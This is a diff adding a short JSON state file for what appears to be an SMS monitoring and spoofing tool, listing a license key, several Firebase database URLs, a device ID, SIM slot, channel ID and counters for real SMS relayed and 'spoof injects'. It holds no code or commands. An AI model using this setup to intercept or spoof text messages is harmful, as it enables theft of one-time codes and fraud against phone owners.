@@ -1,0 +1,36 @@
+{
+  "user_id": "8540504750",
+  "license_key": "KEY-C03X-52GV-0D9H",
+  "firebase_url": "https://kingmaker-1d2b3-default-rtdb.firebaseio.com",
+  "auth_key": "https://kingmaker-1d2b3-default-rtdb.firebaseio.com",
+  "selected_device_id": "50d8637c6cbbde37",
+  "selected_sim_slot": 1,
+  "channel_id": "-1004398745206",
+  "is_polling_active": false,
+  "last_timestamp": 0,
+  "last_updated": "2026-10-24T06:19:45.151286+00:00",
+  "stats_tokens_sent": 0,
+  "stats_real_sms": 337,
+  "stats_spoof_injects": 95,
+  "ignore_initial_messages": false,
+  "saved_firebases": [
+    {
+      "url": "https://bunny-1979f-default-rtdb.asia-southeast1.firebasedatabase.app",
+      "auth": "https://bunny-1979f-default-rtdb.asia-southeast1.firebasedatabase.app"
+    },
+    {
+      "url": "https://honey-5cd25-default-rtdb.asia-southeast1.firebasedatabase.app",
+      "auth": "https://honey-5cd25-default-rtdb.asia-southeast1.firebasedatabase.app"
+    },
+    {
+      "url": "https://orry-c2ab5-default-rtdb.asia-southeast1.firebasedatabase.app",
+      "auth": "https://orry-c2ab5-default-rtdb.asia-southeast1.firebasedatabase.app"
+    },
+    {
+      "url": "https://kingmaker-1d2b3-default-rtdb.firebaseio.com",
+      "auth": "https://kingmaker-1d2b3-default-rtdb.firebaseio.com"
+    }
+  ],
+  "last_message_id": 1792822775195,
+  "monitor_start_time": 1792822084.6616058
+}
